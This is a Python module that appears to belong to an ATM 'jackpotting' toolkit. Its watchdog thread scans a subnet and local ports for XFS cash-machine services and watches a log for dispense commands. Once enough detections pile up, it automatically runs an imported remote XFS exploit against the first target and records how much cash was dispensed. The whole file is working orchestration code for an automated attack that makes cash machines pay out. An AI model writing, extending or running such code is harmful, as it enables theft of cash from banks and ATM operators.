#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
watchdog.py - Autonomous monitoring thread for jackpot detection, now state‑aware.
"""

import threading
import time
import json
from datetime import datetime
from typing import Optional, List, Dict


class JackpotWatchdog(threading.Thread):
    """
    Autonomous watchdog that monitors for jackpot conditions and triggers exploitation.
    Integrates with AgentState for logging and event emission.
    """

    def __init__(self, state=None, interval: float = 5.0, threshold: int = 3,
                 subnet: str = "192.168.1.0/24"):
        super().__init__()
        self.state = state
        self.interval = interval
        self.detection_threshold = threshold
        self.detection_count = 0
        self.triggered = False
        self.running = False
        self.daemon = True
        self.last_check = None
        self.detected_devices = []
        self.results = []
        self.subnet = subnet
        self._xfs_exploit = None
        try:
            from network_xfs import RemoteXFSExploit
            self._xfs_exploit = RemoteXFSExploit(state=state)
        except ImportError:
            self._xfs_exploit = None

    def run(self) -> None:
        self.running = True
        print("🐕 Watchdog monitoring started")
        while self.running:
            try:
                self._check_conditions()
                time.sleep(self.interval)
            except Exception as e:
                print(f"⚠️ Watchdog error: {e}")
                time.sleep(self.interval * 2)

    def _check_conditions(self) -> None:
        if self.triggered:
            return

        # 1. Check for XFS devices via scan
        if self._xfs_exploit:
            try:
                atms = self._xfs_exploit.scan_subnet(self.subnet)
                if atms:
                    self.detection_count += 1
                    print(f"🔍 XFS device detected (count: {self.detection_count})")
                    self._log_detection("xfs_scan", f"Found {len(atms)} devices")
                    if self.state:
                        self.state.push_log(f"watchdog: found {len(atms)} XFS devices")
            except:
                pass

        # 2. Check local XFS service
        try:
            import socket
            for port in [7777, 8888, 9999]:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex(('127.0.0.1', port))
                sock.close()
                if result == 0:
                    self.detection_count += 1
                    print(f"🔍 Local XFS service on port {port} (count: {self.detection_count})")
                    self._log_detection(f"local_xfs_{port}", "Port open")
                    break
        except:
            pass

        # 3. Check for command patterns in logs (simulated)
        try:
            with open('/tmp/jackpot.log', 'r') as f:
                content = f.read()
                if "dispense" in content.lower() or "cdm" in content.lower():
                    self.detection_count += 1
                    self._log_detection("log_pattern", "Dispense pattern in log")
        except:
            pass

        # Trigger if threshold reached
        if self.detection_count >= self.detection_threshold:
            self._trigger_jackpot()
            self.triggered = True

    def _trigger_jackpot(self) -> None:
        print("=" * 60)
        print("🚨 WATCHDOG: JACKPOT CONDITIONS MET")
        print(f"   Detection count: {self.detection_count}")
        print("=" * 60)

        # Execute jackpot sequence if exploit available
        if self._xfs_exploit:
            # Try to exploit the first discovered target
            targets = self._xfs_exploit.targets
            if targets:
                target = targets[0]
                result = self._xfs_exploit.exploit_sequence(target, 7777)
                self.results.append(result)
                if self.state:
                    self.state.record_jackpot_attempt(target, 7777, result['success'], result['amount_dispensed'])
                    self.state.set_last_jackpot_result(result)
                    if result['success']:
                        self.state.push_log(f"WATCHDOG: Jackpot success on {target}")
            else:
                print("⚠️ No targets to exploit")
        else:
            print("⚠️ XFS exploit not available")

    def _log_detection(self, detection_type: str, detail: str) -> None:
        self.detected_devices.append({
            'type': detection_type,
            'detail': detail[:200],
            'timestamp': datetime.now().isoformat()
        })
        if len(self.detected_devices) > 100:
            self.detected_devices = self.detected_devices[-100:]

    def stop(self) -> None:
        self.running = False
        print("🐕 Watchdog stopped")

    def reset(self) -> None:
        self.detection_count = 0
        self.triggered = False
        self.detected_devices = []
        print("🔄 Watchdog reset")

    def get_status(self) -> Dict:
        return {
            'running': self.running,
            'detection_count': self.detection_count,
            'threshold': self.detection_threshold,
            'triggered': self.triggered,
            'detected_devices': self.detected_devices[-10:],
            'last_check': self.last_check
        }

    def is_triggered(self) -> bool:
        return self.triggered
